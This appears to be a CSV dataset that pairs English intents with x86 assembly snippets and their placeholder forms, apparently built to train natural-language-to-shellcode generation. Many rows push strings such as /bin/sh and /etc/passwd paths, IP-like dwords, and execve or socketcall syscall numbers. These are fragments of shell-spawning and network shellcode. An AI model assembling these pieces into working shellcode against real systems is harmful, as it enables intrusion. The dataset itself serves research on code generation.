push 0x68732f2f to the stack,push var0 stack,push 0x68732f2f,push var0
push 0x68732f2f onto the stack,push var0 stack,push 0x68732f2f,push var0
push /bin/sh onto the stack and point the eax register to the stack register,var0 stack and point var1 register stack register,"push 0x68732f2f \n push 0x6e69622f \n mov eax , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
move /bin/sh into eax,var0 var1,"push 0x68732f2f \n push 0x6e69622f \n mov eax , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
put ASCII /bin/sh into eax,put var0 var1,"push 0x68732f2f \n push 0x6e69622f \n mov eax , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
move /bin/sh into the eax register,var0 var1 register,"push 0x68732f2f \n push 0x6e69622f \n mov eax , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
push ASCII /bin/sh onto the stack and point the ebx register to the stack register,push var0 stack and point var1 register stack register,"push 0x68732f2f \n push 0x6e69622f \n mov ebx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
put /bin/sh into ebx,var0 var1,"push 0x68732f2f \n push 0x6e69622f \n mov ebx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
move ASCII /bin/sh into ebx,move var0 var1,"push 0x68732f2f \n push 0x6e69622f \n mov ebx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
move /bin/sh into the ebx register,var0 var1 register,"push 0x68732f2f \n push 0x6e69622f \n mov ebx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
move ASCII /bin/sh into ecx,move var0 var1,"push 0x68732f2f \n push 0x6e69622f \n mov ecx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
move /bin/sh into the ecx register,var0 var1 register,"push 0x68732f2f \n push 0x6e69622f \n mov ecx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
push /bin/sh onto the stack and point the ecx register to the stack register,var0 stack and point var1 register stack register,"push 0x68732f2f \n push 0x6e69622f \n mov ecx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
put /bin/sh into ecx,var0 var1,"push 0x68732f2f \n push 0x6e69622f \n mov ecx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
push ASCII /bin/sh onto the stack and point the edx register to the stack register,push var0 stack and point var1 register stack register,"push 0x68732f2f \n push 0x6e69622f \n mov edx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
put /bin/sh into edx,var0 var1,"push 0x68732f2f \n push 0x6e69622f \n mov edx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
move ASCII /bin/sh into edx,move var0 var1,"push 0x68732f2f \n push 0x6e69622f \n mov edx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
move /bin/sh into the edx register,var0 var1 register,"push 0x68732f2f \n push 0x6e69622f \n mov edx , esp","push 0x68732f2f \n push 0x6e69622f \n mov var1 , esp"
push the 0x68732f6e onto the stack,push var0 stack,push 0x68732f6e,push var0
push 0x68732f6e to the stack,push var0 stack,push 0x68732f6e,push var0
push 0x68732f6e onto the stack,push var0 stack,push 0x68732f6e,push var0
push the value 0x68735858 onto the stack,push value var0 stack,push 0x68735858,push var0
push 0x68736162 to the stack,push var0 stack,push 0x68736162,push var0
push 0x68736162 onto the stack,push var0 stack,push 0x68736162,push var0
push 0x68736164 to the stack,push var0 stack,push 0x68736164,push var0
push 0x68736164 onto the stack,push var0 stack,push 0x68736164,push var0
push the value 0x6873732f onto the stack,push value var0 stack,push 0x6873732f,push var0
push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6873732f \n push 0x6374652f \n mov eax , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6873732f \n push 0x6374652f \n mov ebx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6873732f \n push 0x6374652f \n mov ecx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6873732f \n push 0x6374652f \n mov edi , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6873732f \n push 0x6374652f \n mov edx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6873732f \n push 0x6374652f \n mov esi , esp","push var0 \n push var1 \n mov var2 , esp"
push 0x68737a2f onto the stack,push var0 stack,push 0x68737a2f,push var0
push the 0x69616863 onto the stack,push var0 stack,push 0x69616863,push var0
push the 0x69622f2f onto the stack,push var0 stack,push 0x69622f2f,push var0
push 0x69622f2f to the stack,push var0 stack,push 0x69622f2f,push var0
push 0x69622f2f onto the stack,push var0 stack,push 0x69622f2f,push var0
push the value 0x69622f2f onto the stack and point the eax register to the stack register,push value var0 stack and point var1 register stack register,"push 0x69622f2f \n mov eax , esp","push var0 \n mov var1 , esp"
push the value 0x69622f2f onto the stack and point the ebx register to the stack register,push value var0 stack and point var1 register stack register,"push 0x69622f2f \n mov ebx , esp","push var0 \n mov var1 , esp"
push the value 0x69622f2f onto the stack and point the ecx register to the stack register,push value var0 stack and point var1 register stack register,"push 0x69622f2f \n mov ecx , esp","push var0 \n mov var1 , esp"
push the value 0x69622f2f onto the stack and point the edx register to the stack register,push value var0 stack and point var1 register stack register,"push 0x69622f2f \n mov edx , esp","push var0 \n mov var1 , esp"
push 0x69622f3a onto the stack,push var0 stack,push 0x69622f3a,push var0
push 0x69622f65 onto the stack,push var0 stack,push 0x69622f65,push var0
push 0x69622f65 to the stack,push var0 stack,push 0x69622f65,push var0
push the 0x69622f65 onto the stack,push var0 stack,push 0x69622f65,push var0
push 0x6962732f onto the stack,push var0 stack,push 0x6962732f,push var0
push the 0x6962732f onto the stack,push var0 stack,push 0x6962732f,push var0
push 0x6c626174 onto the stack,push var0 stack,push 0x6c626174,push var0
push the 0x6d722f2f onto the stack,push var0 stack,push 0x6d722f2f,push var0
push 0x6d726574 onto the stack,push var0 stack,push 0x6d726574,push var0
push 0x6d726574 to the stack,push var0 stack,push 0x6d726574,push var0
push the 0x6e onto the stack,push var0 stack,push 0x6e,push var0
push /bin to the stack,var0 stack,push 0x6e69622f,push 0x6e69622f
push 0x6e69622f onto the stack,push var0 stack,push 0x6e69622f,push var0
push ascii nib/ onto stack,push ascii var0 stack,push 0x6e69622f,push 0x6e69622f
push nib/,push var0,push 0x6e69622f,push 0x6e69622f
push the 0x6e69622f onto the stack,push var0 stack,push 0x6e69622f,push var0
push the value 0x6e69622f onto the stack,push value var0 stack,push 0x6e69622f,push var0
push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6e69622f \n push 0x7273752f \n mov eax , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6e69622f \n push 0x7273752f \n mov ebx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6e69622f \n push 0x7273752f \n mov ecx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6e69622f \n push 0x7273752f \n mov edx , esp","push var0 \n push var1 \n mov var2 , esp"
push the 0x6e776f64 onto the stack,push var0 stack,push 0x6e776f64,push var0
push 0x6e7a762d onto the stack,push var0 stack,push 0x6e7a762d,push var0
push the value 0x6e7a762d onto the stack and point the ebp register to the stack register,push value var0 stack and point var1 register stack register,"push 0x6e7a762d \n mov ebp , esp","push var0 \n mov var1 , esp"
push the value 0x6e7a762d onto the stack and point the ebx register to the stack register,push value var0 stack and point var1 register stack register,"push 0x6e7a762d \n mov ebx , esp","push var0 \n mov var1 , esp"
push the value 0x6e7a762d onto the stack and point the edi register to the stack register,push value var0 stack and point var1 register stack register,"push 0x6e7a762d \n mov edi , esp","push var0 \n mov var1 , esp"
push the value 0x6e7a762d onto the stack and point the esi register to the stack register,push value var0 stack and point var1 register stack register,"push 0x6e7a762d \n mov esi , esp","push var0 \n mov var1 , esp"
push 0x6f635f64 onto the stack,push var0 stack,push 0x6f635f64,push var0
push 0x6f723a30 onto the stack,push var0 stack,push 0x6f723a30,push var0
push the value 0x7 onto the stack and point edx to the stack register,push value var0 stack and point var1 stack register,"push 0x7 \n mov edx , esp","push var0 \n mov var1 , esp"
push 0x70692f6e onto the stack,push var0 stack,push 0x70692f6e,push var0
push the 0x70692f6e onto the stack,push var0 stack,push 0x70692f6e,push var0
push 0x706d742f onto the stack,push var0 stack,push 0x706d742f,push var0
push 0x706d742f to the stack,push var0 stack,push 0x706d742f,push var0
push the 0x706d742f onto the stack,push var0 stack,push 0x706d742f,push var0
push 0x7268732f onto the stack,push var0 stack,push 0x7268732f,push var0
push 0x72706475 onto the stack,push var0 stack,push 0x72706475,push var0
push 0x7273752f onto the stack,push var0 stack,push 0x7273752f,push var0
push 0x7273752f to the stack,push var0 stack,push 0x7273752f,push var0
push 0x7361702f to the stack,push var0 stack,push 0x7361702f,push var0
push 0x7361702f onto the stack,push var0 stack,push 0x7361702f,push var0
push 0x73644d24 onto the stack,push var0 stack,push 0x73644d24,push var0
push 0x7369642d to the stack,push var0 stack,push 0x7369642d,push var0
push 0x7369642d onto the stack,push var0 stack,push 0x7369642d,push var0
push the 0x7372656f onto the stack,push var0 stack,push 0x7372656f,push var0
push 0x7372656f to the stack,push var0 stack,push 0x7372656f,push var0
push 0x7372656f onto the stack,push var0 stack,push 0x7372656f,push var0
push 0x7374736f onto the stack,push var0 stack,push 0x7374736f,push var0
push the 0x7374736f onto the stack,push var0 stack,push 0x7374736f,push var0
push 0x74 onto the stack,push var0 stack,push 0x74,push var0
push 0x74 to the stack,push var0 stack,push 0x74,push var0
push 0x742f2f2f onto the stack,push var0 stack,push 0x742f2f2f,push var0
push the 0x742f2f2f onto the stack,push var0 stack,push 0x742f2f2f,push var0
push 0x742f3a31 onto the stack,push var0 stack,push 0x742f3a31,push var0
push 0x74303072 onto the stack,push var0 stack,push 0x74303072,push var0
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x7461632f \n push 0x6e69622f \n mov eax , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x7461632f \n push 0x6e69622f \n mov ebx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ecx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x7461632f \n push 0x6e69622f \n mov ecx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x7461632f \n push 0x6e69622f \n mov edi , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x7461632f \n push 0x6e69622f \n mov edx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x7461632f \n push 0x6e69622f \n mov esi , esp","push var0 \n push var1 \n mov var2 , esp"
push the 0x74652f2f onto the stack,push var0 stack,push 0x74652f2f,push var0
push 0x74652f2f onto the stack,push var0 stack,push 0x74652f2f,push var0
push 0x746f6f72 onto the stack,push var0 stack,push 0x746f6f72,push var0
push the 0x74756873 onto the stack,push var0 stack,push 0x74756873,push var0
push 0x74756f2f onto the stack,push var0 stack,push 0x74756f2f,push var0
push the 0x74756f2f onto the stack,push var0 stack,push 0x74756f2f,push var0
push 0x752f2f2f onto the stack,push var0 stack,push 0x752f2f2f,push var0
push 0x752f2f2f to the stack,push var0 stack,push 0x752f2f2f,push var0
push 0x7665642f onto the stack,push var0 stack,push 0x7665642f,push var0
push the 0x7665642f onto the stack,push var0 stack,push 0x7665642f,push var0
push 0x76766c2d onto the stack,push var0 stack,push 0x76766c2d,push var0
push 0x76766c2d to the stack,push var0 stack,push 0x76766c2d,push var0
push the 0x76766c2d onto the stack,push var0 stack,push 0x76766c2d,push var0
push 0x78 onto the stack,push var0 stack,push 0x78,push var0
push 0x78 to the stack,push var0 stack,push 0x78,push var0
push the 0x78 onto the stack,push var0 stack,push 0x78,push var0
push 0x782f2f32 onto the stack,push var0 stack,push 0x782f2f32,push var0
push 0x782f2f32 to the stack,push var0 stack,push 0x782f2f32,push var0
push 0x782f6e69 onto the stack,push var0 stack,push 0x782f6e69,push var0
push 0x782f6e69 to the stack,push var0 stack,push 0x782f6e69,push var0
push 0x78534a52 onto the stack,push var0 stack,push 0x78534a52,push var0
push 0x79616c70 to the stack,push var0 stack,push 0x79616c70,push var0
push 0x79616c70 onto the stack,push var0 stack,push 0x79616c70,push var0
push 0x8 onto the stack,push var0 stack,push 0x8,push var0
push 0x81e3a8c0 onto the stack,push var0 stack,push 0x81e3a8c0,push var0
push 0x8501a8c0 onto the stack,push var0 stack,push 0x8501a8c0,push var0
push 0xa onto the stack,push var0 stack,push 0xa,push var0
push 0xa to the stack,push var0 stack,push 0xa,push var0
push the 0xa01a8c0 onto the stack,push var0 stack,push 0xa01a8c0,push var0
push 0xb to the stack,push var0 stack,push 0xb,push var0
push 0xb onto the stack,push var0 stack,push 0xb,push var0
push 0xdebf value to the stack,push var0 value stack,push 0xdebf,push var0
push 0xefffff7f onto the stack,push var0 stack,push 0xefffff7f,push var0
push 0xf onto the stack,push var0 stack,push 0xf,push var0
push 1 to the stack,push 1 stack,push 1,push 1
push 1 onto the stack,push 1 stack,push 1,push 1
push 10 onto the stack,push 10 stack,push 10,push 10
push the value 10 onto the stack and point eax to the stack register,push value 10 stack and point var0 stack register,"push 10 \n mov eax , esp","push 10 \n mov var0 , esp"
push 102 onto the stack,push 102 stack,push 102,push 102
push the value 12 onto the stack and point ebx to the stack register,push value 12 stack and point var0 stack register,"push 12 \n mov ebx , esp","push 12 \n mov var0 , esp"
push the value 15 onto the stack and point ecx to the stack register,push value 15 stack and point var0 stack register,"push 15 \n mov ecx , esp","push 15 \n mov var0 , esp"
push 16 onto the stack,push 16 stack,push 16,push 16
push 2 onto the stack,push 2 stack,push 2,push 2
push 20 onto the stack,push 20 stack,push 20,push 20
push the 20 onto the stack,push 20 stack,push 20,push 20
push 216 value to the stack,push 216 value stack,push 216,push 216
push 6 onto the stack,push 6 stack,push 6,push 6
push ax onto the stack,push ax stack,push ax,push ax
push ax to the stack,push ax stack,push ax,push ax
push the ax onto the stack,push ax stack,push ax,push ax
push bx onto the stack,push var0 stack,push bx,push var0
push bx to the stack,push var0 stack,push bx,push var0
push the contents of the bx register onto the stack,push contents var0 register stack,push bx,push var0
push the byte -1 onto the stack,push var0 stack,push byte -1,push var0
push the byte +0x1 onto the stack,push var0 stack,push byte +0x1,push var0
push the byte +0x10 onto the stack,push var0 stack,push byte +0x10,push var0
push the byte +0x2 onto the stack,push var0 stack,push byte +0x2,push var0
push the byte +0x3 onto the stack,push var0 stack,push byte +0x3,push var0
push the byte +0x46 onto the stack,push var0 stack,push byte +0x46,push var0
push the byte +0x6 onto the stack,push var0 stack,push byte +0x6,push var0
push the byte +0x66 onto the stack,push var0 stack,push byte +0x66,push var0
push the byte +0x7f onto the stack,push var0 stack,push byte +0x7f,push var0
push the byte +0x8 onto the stack,push var0 stack,push byte +0x8,push var0
push the byte +0xb onto the stack,push var0 stack,push byte +0xb,push var0
push byte 0 onto stack,push byte 0 stack,push byte 0,push byte 0
push the byte 0x0 onto the stack,push byte var0 stack,push byte 0x0,push byte var0
push the byte 0x01 onto the stack,push byte var0 stack,push byte 0x01,push byte var0
push the byte 0x01 to the stack,push byte var0 stack,push byte 0x01,push byte var0
put the syscall 0x01 into the eax register,put syscall var0 var1 register,push byte 0x01 \n pop eax,push byte var0 \n pop var1
push the byte 0x02 onto the stack,push byte var0 stack,push byte 0x02,push byte var0
push the byte 0x02 to the stack,push byte var0 stack,push byte 0x02,push byte var0
put the syscall 0x02 into the eax register,put syscall var0 var1 register,push byte 0x02 \n pop eax,push byte var0 \n pop var1
push the byte 0x04 onto the stack,push byte var0 stack,push byte 0x04,push byte var0
put the syscall 0x04 into the eax register,put syscall var0 var1 register,push byte 0x04 \n pop eax,push byte var0 \n pop var1
push the byte 0x05 onto the stack,push byte var0 stack,push byte 0x05,push byte var0
put the syscall 0x05 into the eax register,put syscall var0 var1 register,push byte 0x05 \n pop eax,push byte var0 \n pop var1
push the byte 0x06 onto the stack,push byte var0 stack,push byte 0x06,push byte var0
put the syscall 0x06 into the eax register,put syscall var0 var1 register,push byte 0x06 \n pop eax,push byte var0 \n pop var1
push the byte 0x0b onto the stack,push byte var0 stack,push byte 0x0b,push byte var0
put the syscall 0x0b into the eax register,put syscall var0 var1 register,push byte 0x0b \n pop eax,push byte var0 \n pop var1
push the byte 0x1 to the stack,push byte var0 stack,push byte 0x1,push byte var0
push the byte 0x1 onto the stack,push byte var0 stack,push byte 0x1,push byte var0
push the byte 0x1 onto the stack and point ecx to the stack register,push byte var0 stack and point var1 stack register,"push byte 0x1 \n mov ecx , esp","push byte var0 \n mov var1 , esp"
push the byte 0x10 onto the stack,push byte var0 stack,push byte 0x10,push byte var0
put the syscall 0x10 into the eax register,put syscall var0 var1 register,push byte 0x10 \n pop eax,push byte var0 \n pop var1
push the byte 0x11 onto the stack and point ebx to the stack register,push byte var0 stack and point var1 stack register,"push byte 0x11 \n mov ebx , esp","push byte var0 \n mov var1 , esp"
push the byte 0x17 onto the stack,push byte var0 stack,push byte 0x17,push byte var0
put the syscall 0x17 into the eax register,put syscall var0 var1 register,push byte 0x17 \n pop eax,push byte var0 \n pop var1
push the byte 0x1c onto the stack,push byte var0 stack,push byte 0x1c,push byte var0
put the syscall 0x1c into the eax register,put syscall var0 var1 register,push byte 0x1c \n pop eax,push byte var0 \n pop var1
push the byte 0x1f onto the stack,push byte var0 stack,push byte 0x1f,push byte var0
put the syscall 0x1f into the eax register,put syscall var0 var1 register,push byte 0x1f \n pop eax,push byte var0 \n pop var1
push the byte 0x2 onto the stack,push byte var0 stack,push byte 0x2,push byte var0
push the byte 0x2 to the stack,push byte var0 stack,push byte 0x2,push byte var0
push the byte 0x2 onto the stack and point ecx to the stack register,push byte var0 stack and point var1 stack register,"push byte 0x2 \n mov ecx , esp","push byte var0 \n mov var1 , esp"
put the syscall 0x2 into the eax register,put syscall var0 var1 register,push byte 0x2 \n pop eax,push byte var0 \n pop var1
push the byte 0x2e onto the stack,push byte var0 stack,push byte 0x2e,push byte var0
put the syscall 0x2e into the eax register,put syscall var0 var1 register,push byte 0x2e \n pop eax,push byte var0 \n pop var1
push the byte 0x2f onto the stack,push byte var0 stack,push byte 0x2f,push byte var0
put the syscall 0x2f into the eax register,put syscall var0 var1 register,push byte 0x2f \n pop eax,push byte var0 \n pop var1
push the byte 0x3 onto the stack,push byte var0 stack,push byte 0x3,push byte var0
put the syscall 0x3 into the eax register,put syscall var0 var1 register,push byte 0x3 \n pop eax,push byte var0 \n pop var1
push the byte 0x30 onto the stack,push byte var0 stack,push byte 0x30,push byte var0
put the syscall 0x30 into the eax register,put syscall var0 var1 register,push byte 0x30 \n pop eax,push byte var0 \n pop var1
push the byte 0x3f onto the stack,push byte var0 stack,push byte 0x3f,push byte var0
put the syscall 0x3f into the eax register,put syscall var0 var1 register,push byte 0x3f \n pop eax,push byte var0 \n pop var1
push the byte 0x4 onto the stack,push byte var0 stack,push byte 0x4,push byte var0
put the syscall 0x4 into the eax register,put syscall var0 var1 register,push byte 0x4 \n pop eax,push byte var0 \n pop var1
make the system call sigaction,make system call var0,push byte 0x43,push byte 0x43
sigaction,var0,push byte 0x43,push byte 0x43
syscall for sigaction,syscall var0 var1,push byte 0x43,push byte 0x43
system call sigaction,system call var0,push byte 0x43,push byte 0x43
put syscall sigaction into the eax register,put syscall var0 var1 register,push byte 0x43 \n pop eax,push byte 0x43 \n pop var1
put the syscall 0x43 into the eax register,put syscall var0 var1 register,push byte 0x43 \n pop eax,push byte var0 \n pop var1
push the byte 0x5 onto the stack and point ebx to the stack register,push byte var0 stack and point var1 stack register,"push byte 0x5 \n mov ebx , esp","push byte var0 \n mov var1 , esp"
push the byte 0x5 onto the stack and point edx to the stack register,push byte var0 stack and point var1 stack register,"push byte 0x5 \n mov edx , esp","push byte var0 \n mov var1 , esp"
push the byte 0x64 to the stack,push byte var0 stack,push byte 0x64,push byte var0
push the byte 0x64 onto the stack,push byte var0 stack,push byte 0x64,push byte var0
put the syscall 0x64 into the eax register,put syscall var0 var1 register,push byte 0x64 \n pop eax,push byte var0 \n pop var1
push the byte 0x66 onto the stack,push byte var0 stack,push byte 0x66,push byte var0
put the syscall 0x66 into the eax register,put syscall var0 var1 register,push byte 0x66 \n pop eax,push byte var0 \n pop var1
push the byte 0x7 onto the stack and point edx to the stack register,push byte var0 stack and point var1 stack register,"push byte 0x7 \n mov edx , esp","push byte var0 \n mov var1 , esp"
push the byte 0x77 to the stack,push byte var0 stack,push byte 0x77,push byte var0
push the byte 0x77 onto the stack,push byte var0 stack,push byte 0x77,push byte var0
put the syscall 0x77 into the eax register,put syscall var0 var1 register,push byte 0x77 \n pop eax,push byte var0 \n pop var1
push the byte 0x8 onto the stack and point edx to the stack register,push byte var0 stack and point var1 stack register,"push byte 0x8 \n mov edx , esp","push byte var0 \n mov var1 , esp"
push the byte 0xb onto the stack,push byte var0 stack,push byte 0xb,push byte var0
put the syscall 0xb into the eax register,put syscall var0 var1 register,push byte 0xb \n pop eax,push byte var0 \n pop var1
push the byte 0xc onto the stack,push byte var0 stack,push byte 0xc,push byte var0
put the syscall 0xc into the eax register,put syscall var0 var1 register,push byte 0xc \n pop eax,push byte var0 \n pop var1
move byte 1 onto stack,move byte 1 stack,push byte 1,push byte 1
push byte 1 onto the stack,push byte 1 stack,push byte 1,push byte 1
push the byte 1 to the stack,push byte 1 stack,push byte 1,push byte 1
push the byte 1 onto the stack,push byte 1 stack,push byte 1,push byte 1
push the byte 1 onto the stack and point eax to the stack register,push byte 1 stack and point var0 stack register,"push byte 1 \n mov eax , esp","push byte 1 \n mov var0 , esp"
put the syscall 1 into the eax register,put syscall 1 var0 register,push byte 1 \n pop eax,push byte 1 \n pop var0
push the byte 10 onto the stack,push byte 10 stack,push byte 10,push byte 10
push the byte 10 to the stack,push byte 10 stack,push byte 10,push byte 10
put the syscall 10 into the eax register,put syscall 10 var0 register,push byte 10 \n pop eax,push byte 10 \n pop var0
push the byte 11 onto the stack,push byte 11 stack,push byte 11,push byte 11
push the byte 11 to the stack,push byte 11 stack,push byte 11,push byte 11
put the syscall 11 into the eax register,put syscall 11 var0 register,push byte 11 \n pop eax,push byte 11 \n pop var0
push the byte 15 onto the stack,push byte 15 stack,push byte 15,push byte 15
push the byte 15 to the stack,push byte 15 stack,push byte 15,push byte 15
put the syscall 15 into the eax register,put syscall 15 var0 register,push byte 15 \n pop eax,push byte 15 \n pop var0
push byte 16 onto stack,push byte 16 stack,push byte 16,push byte 16
push the byte 16 onto the stack,push byte 16 stack,push byte 16,push byte 16
put the syscall 16 into the eax register,put syscall 16 var0 register,push byte 16 \n pop eax,push byte 16 \n pop var0
push the byte 17h onto the stack,push byte var0 stack,push byte 17h,push byte var0
put the syscall 17h into the eax register,put syscall var0 var1 register,push byte 17h \n pop eax,push byte var0 \n pop var1
push byte 2 onto the stack,push byte 2 stack,push byte 2,push byte 2
push the byte 2 onto the stack,push byte 2 stack,push byte 2,push byte 2
put the syscall 2 into the eax register,put syscall 2 var0 register,push byte 2 \n pop eax,push byte 2 \n pop var0
push the byte 25 onto the stack,push byte 25 stack,push byte 25,push byte 25
put the syscall 25 into the eax register,put syscall 25 var0 register,push byte 25 \n pop eax,push byte 25 \n pop var0
push the byte 28 to the stack,push byte 28 stack,push byte 28,push byte 28
put the syscall 28 into the eax register,put syscall 28 var0 register,push byte 28 \n pop eax,push byte 28 \n pop var0
push the byte 3 onto the stack and point ebx to the stack register,push byte 3 stack and point var0 stack register,"push byte 3 \n mov ebx , esp","push byte 3 \n mov var0 , esp"
push the byte 37 onto the stack,push byte 37 stack,push byte 37,push byte 37
put the syscall 37 into the eax register,put syscall 37 var0 register,push byte 37 \n pop eax,push byte 37 \n pop var0
push the byte 3h onto the stack,push byte var0 stack,push byte 3h,push byte var0
put the syscall 3h into the eax register,put syscall 3h var0 register,push byte 3h \n pop eax,push byte 3h \n pop var0
push the byte 4 onto the stack,push byte 4 stack,push byte 4,push byte 4
put the syscall 4 into the eax register,put syscall 4 var0 register,push byte 4 \n pop eax,push byte 4 \n pop var0
push the byte 49 onto the stack,push byte 49 stack,push byte 49,push byte 49
put the syscall 49 into the eax register,put syscall 49 var0 register,push byte 49 \n pop eax,push byte 49 \n pop var0
push the byte 5 onto the stack,push byte 5 stack,push byte 5,push byte 5
put the syscall 5 into the eax register,put syscall 5 var0 register,push byte 5 \n pop eax,push byte 5 \n pop var0
push the byte 54 onto the stack,push byte 54 stack,push byte 54,push byte 54
put the syscall 54 into the eax register,put syscall 54 var0 register,push byte 54 \n pop eax,push byte 54 \n pop var0
push byte 6 onto the stack,push byte 6 stack,push byte 6,push byte 6
push the byte 6 onto the stack,push byte 6 stack,push byte 6,push byte 6
push the byte 6 to the stack,push byte 6 stack,push byte 6,push byte 6
put the syscall 6 into the eax register,put syscall 6 var0 register,push byte 6 \n pop eax,push byte 6 \n pop var0
push the byte 67 onto the stack,push byte 67 stack,push byte 67,push byte 67
put the syscall 67 into the eax register,put syscall 67 var0 register,push byte 67 \n pop eax,push byte 67 \n pop var0
push the byte 70 onto the stack,push byte 70 stack,push byte 70,push byte 70
put the syscall 70 into the eax register,put syscall 70 var0 register,push byte 70 \n pop eax,push byte 70 \n pop var0
push the byte 8 onto the stack,push byte 8 stack,push byte 8,push byte 8
put the syscall 8 into the eax register,put syscall 8 var0 register,push byte 8 \n pop eax,push byte 8 \n pop var0
push the byte 9 onto the stack,push byte 9 stack,push byte 9,push byte 9
put the syscall 9 into the eax register,put syscall 9 var0 register,push byte 9 \n pop eax,push byte 9 \n pop var0
push the byte chmod_call onto the stack,push byte var0 stack,push byte chmod_call,push byte var0
put the byte my_label into the eax register,put byte var0 var1 register,push byte CHMOD_CALL \n pop eax,push byte CHMOD_CALL \n pop var1
put the byte CHMOD_CALL into the eax register,put byte var0 var1 register,push byte CHMOD_CALL \n pop eax,push byte var0 \n pop var1
put the byte L1 into the eax register,put byte var0 var1 register,push byte L1 \n pop eax,push byte var0 \n pop var1
put the byte my_value into the eax register,put byte var0 var1 register,push byte my_value \n pop eax,push byte var0 \n pop var1
put the byte VALUE into the eax register,put byte var0 var1 register,push byte VALUE \n pop eax,push byte var0 \n pop var1
push the contents of the cx register onto the stack,push contents cx register stack,push cx,push cx
push the dword [ebp+16] onto the stack,push the dword [ebp+16] onto the stack,push dword [ebp+16],push dword [ebp+16]
push the doubleword [edx+2] to the stack,push the doubleword [edx+2] to the stack,push dword [edx+2],push dword [edx+2]
push the dword [edx+2] onto the stack,push the dword [edx+2] onto the stack,push dword [edx+2],push dword [edx+2]
push the doubleword 0x00000000 onto the stack,push doubleword var0 stack,push dword 0x00000000,push dword var0
push the dword 0x0101017f onto the stack,push dword var0 stack,push dword 0x0101017f,push dword var0
push the dword 0x017aa8c0 onto the stack,push dword var0 stack,push dword 0x017aa8c0,push dword var0
push the dword 0x0501a8c0 onto the stack,push dword var0 stack,push dword 0x0501a8c0,push dword var0
push the double word 0x0a206873 onto the stack,push double word var0 stack,push dword 0x0a206873,push dword var0
push the dword 0x10 onto the stack,push dword var0 stack,push dword 0x10,push dword var0
push the double word 2 onto the stack,push double word 2 stack,push dword 0x2,push dword 0x2
push the dword 0x214c4f4c onto the stack,push dword var0 stack,push dword 0x214c4f4c,push dword var0
push the double word 0x2335738c onto the stack,push double word var0 stack,push dword 0x2335738c,push dword var0
push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register,push double word var0 and double word var1 stack and point var2 register stack register,"push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov eax , esp","push dword var0 \n push dword var1 \n mov var2 , esp"
push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ebx register to the stack register,push double word var0 and double word var1 stack and point var2 register stack register,"push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ebx , esp","push dword var0 \n push dword var1 \n mov var2 , esp"
push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register,push double word var0 and double word var1 stack and point var2 register stack register,"push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ecx , esp","push dword var0 \n push dword var1 \n mov var2 , esp"
